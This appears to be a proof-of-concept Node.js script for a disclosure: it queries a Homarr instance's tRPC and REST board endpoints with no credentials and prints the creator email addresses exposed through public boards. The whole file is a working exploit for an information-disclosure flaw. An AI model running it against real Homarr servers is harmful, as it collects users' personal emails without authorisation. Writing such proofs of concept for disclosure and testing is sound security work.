#!/usr/bin/env node
/**
 * PoC — Homarr unauthenticated board-creator email disclosure
 * Endpoint: board.getAllBoards (publicProcedure)  |  also REST: GET /api/boards
 *
 * Usage:  node poc-01-getAllBoards.mjs https://your-homarr-host
 * Sends NO credentials (no cookie, no x-api-key). Prints any leaked creator emails.
 */
const base = (process.argv[2] || process.env.HOMARR_URL || "http://localhost:7575").replace(/\/$/, "");

// tRPC v11 + superjson, GET query, void input -> input={"0":{"json":null}}
const input = encodeURIComponent(JSON.stringify({ "0": { json: null } }));
const trpcUrl = `${base}/api/trpc/board.getAllBoards?batch=1&input=${input}`;
const restUrl = `${base}/api/boards`;

const unwrap = (body) => {
  // tRPC batch envelope: [{result:{data:{json:[...]}}}]
  try {
    const parsed = JSON.parse(body);
    if (Array.isArray(parsed)) return parsed[0]?.result?.data?.json ?? parsed[0]?.result?.data ?? parsed;
    return parsed;
  } catch { return null; }
};

const emailsOf = (boards) =>
  (Array.isArray(boards) ? boards : [])
    .filter((b) => b && b.isPublic && b.creator && b.creator.email)
    .map((b) => ({ board: b.name, creatorEmail: b.creator.email }));

async function hit(label, url, headers = {}) {
  const res = await fetch(url, { headers });
  const text = await res.text();
  const leaked = emailsOf(unwrap(text));
  console.log(`\n[${label}] ${url}`);
  console.log(`  HTTP ${res.status} (sent no auth)`);
  if (leaked.length) {
    console.log(`  >>> LEAKED ${leaked.length} creator email(s) to an UNAUTHENTICATED caller:`);
    for (const l of leaked) console.log(`      public board "${l.board}" -> ${l.creatorEmail}`);
  } else {
    console.log("  no public-board creator emails in response (needs >=1 public board to demonstrate)");
    console.log(`  raw: ${text.slice(0, 300)}`);
  }
}

await hit("tRPC", trpcUrl);
await hit("REST", restUrl);
